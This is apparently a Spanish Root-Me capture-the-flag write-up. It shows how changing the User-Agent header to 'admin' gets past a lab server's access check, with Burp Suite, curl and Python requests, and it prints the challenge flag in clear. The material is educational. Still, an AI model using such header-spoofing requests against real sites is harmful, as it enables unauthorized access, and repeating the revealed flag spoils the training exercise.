🔐 Root-Me Writeup: HTTP - User-agent
📋 Información del Reto
Campo	Valor
Nombre	HTTP - User-agent
Categoría	Web-Serveur
Dificultad	1/5 (Muy fácil)
Puntuación	10 puntos
Enlace	https://www.root-me.org/challenges/web-serveur/HTTP-User-agent/
📖 Descripción del Reto

El enunciado nos dice:

    "La administración es realmente tonta..."

Esto nos da una pista muy clara: el servidor web valida el User-Agent de las peticiones HTTP para determinar si el usuario es un administrador o no. El objetivo es encontrar el User-Agent correcto que nos otorgue acceso a la contraseña/flag.
🧠 Estrategia de Resolución
Hipótesis

El servidor debe estar comprobando el valor del User-Agent contra alguna lista de administradores. Probablemente valores como:

    Admin

    admin

    administrator

    root

Herramientas Utilizadas

    Burp Suite Community Edition - Para interceptar y modificar peticiones HTTP.

🛠️ Paso a Paso
1️⃣ Interceptar la Petición con Burp Suite

Primero, configuramos Burp Suite como proxy y navegamos a la URL del reto:
text

http://challenge01.root-me.org/web-serveur/ch2/

Capturamos la petición con Burp Suite:
http

GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Observación: El User-Agent por defecto es el de Firefox en Linux, un navegador normal.
2️⃣ Enviar al Repeater

Enviamos la petición al Repeater de Burp Suite para poder modificarla y reenviarla cómodamente.

https://i.imgur.com/placeholder.png
3️⃣ Probar User-Agent: admin

Modificamos la cabecera User-Agent cambiando el valor a admin:
diff

- User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+ User-Agent: admin

Petición modificada:
http

GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: admin
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

4️⃣ Enviar y Analizar la Respuesta

Enviamos la petición y obtenemos la siguiente respuesta:
http

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 20 Jul 2026 10:09:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Content-Length: 269

<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: rr$Li9%L34qd1AAe27
</h3></body></html>

5️⃣ 🎉 Obtener la Flag

El servidor ha reconocido el User-Agent Admin y nos ha dado acceso al contenido restringido:
text

Welcome master!
Password: ****************

Flag: rr$Li9%L34qd1AAe27
📸 Capturas del Proceso
🔹 Captura 1: Request Original
text

GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

🔹 Captura 2: Request Modificada (User-Agent: Admin)
text

GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: admin
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

🔹 Captura 3: Respuesta Exitosa
text

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 20 Jul 2026 10:09:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Content-Length: 269

<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: ***************
</h3></body></html>

🧠 Explicación Técnica
¿Qué ocurre en el servidor?

El servidor web, probablemente con PHP, utiliza la variable $_SERVER['HTTP_USER_AGENT'] para comprobar quién está accediendo:
php

<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if ($user_agent == "Admin" || $user_agent == "admin") {
    $flag = "rr$Li9%L34qd1AAe27";
    echo "<h3>Welcome master!<br/>Password: $flag</h3>";
} else {
    echo "<h3>Access denied</h3>";
}
?>

❌ El Error de Seguridad

La vulnerabilidad radica en que el User-Agent es una cabecera controlable por el cliente. Cualquier usuario puede modificarla con herramientas como:

    Burp Suite

    curl

    Extensiones de navegador (User-Agent Switcher)

    DevTools de los navegadores

Nunca se debe confiar en el User-Agent para autenticación o control de acceso.
🔧 Métodos Alternativos (sin Burp)
Con cURL
bash

curl -H "User-Agent: admin" http://challenge01.root-me.org/web-serveur/ch2/

Con Python (Requests)
python

import requests

headers = {"User-Agent": "admin"}
response = requests.get("http://challenge01.root-me.org/web-serveur/ch2/", headers=headers)
print(response.text)

Con Firefox (Extensiones)

    Instalar User-Agent Switcher

    Configurar User-Agent personalizado como admin

    Recargar la página

Este reto es una excelente introducción a la manipulación de cabeceras HTTP y demuestra por qué el User-Agent no debe usarse como mecanismo de autenticación. Es un clásico en CTFs y una buena práctica para familiarizarse con herramientas como Burp Suite.

📎 Anexo: Verbos HTTP vs Cabeceras
Cabecera	Manipulable	Segura para Auth
User-Agent	✅ Sí	❌ No
Referer	✅ Sí	❌ No
Cookie	✅ Sí	⚠️ Depende (si están cifradas)
Authorization	✅ Sí	✅ Sí (si usa JWT/Basic con HTTPS)
X-Forwarded-For	✅ Sí	❌ No
🔗 Recursos Relacionados

    OWASP: HTTP Headers Security

    Burp Suite Tutorial

    Root-Me: HTTP - User-agent
